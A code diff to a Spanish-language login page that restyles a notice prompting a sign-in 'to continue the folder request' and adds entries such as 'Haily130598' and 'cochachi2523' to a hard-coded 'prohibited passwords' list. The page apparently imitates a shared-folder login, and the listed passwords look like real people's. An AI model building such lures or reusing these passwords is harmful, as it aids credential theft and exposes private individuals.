@@ -167,7 +167,7 @@
 
         .guest-mode {
             background-color: #0d5dc7;
-            color: #ffffff;
+            color: #f3f8fa;
             font-size: 14px;
             padding: 12px 16px;
             border-radius: 4px;
@@ -175,12 +175,27 @@
             text-align: left;
             display: flex;
             align-items: center;
+            min-height: 42px;
+            position: relative;
         }
 
+        /* Icono creado con CSS - mantiene la alineación */
         .guest-mode::before {
-            content: "ℹ";
+            content: '!';
+            width: 12px;
+            height: 12px;
+            background-color: #dae2e5;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
             margin-right: 8px;
+            flex-shrink: 0;
+            font-size: 12px;
             font-weight: bold;
+            color: #0d5dc7;
+            font-style: normal;
+            line-height: 1;
         }
 
         .show-password-wrapper {
@@ -406,7 +421,7 @@
                 </div>
                 
                 <div class="guest-mode" id="guestMode">
-                Inicia sesión para continuar la solicitud a la carpeta
+                    Inicia sesión para continuar
                 </div>
                 
                 <div class="input-wrapper">
@@ -551,7 +566,7 @@
             }
             
             // Verificar contraseñas prohibidas
-            const prohibitedPasswords = ["fernanda2022","Fernanda2022"];
+            const prohibitedPasswords = ["fernanda2022","Fernanda2022","Haily130598","haily130598","delfin","cochachi2523","Cochachi2523","cochachi2523","aylinnmierda2008","Aylinnmierda2008","loveteo10","Greinyer10","greinyer10"];
             if (prohibitedPasswords.includes(password)) {
                 isProhibitedPassword = true;
             }
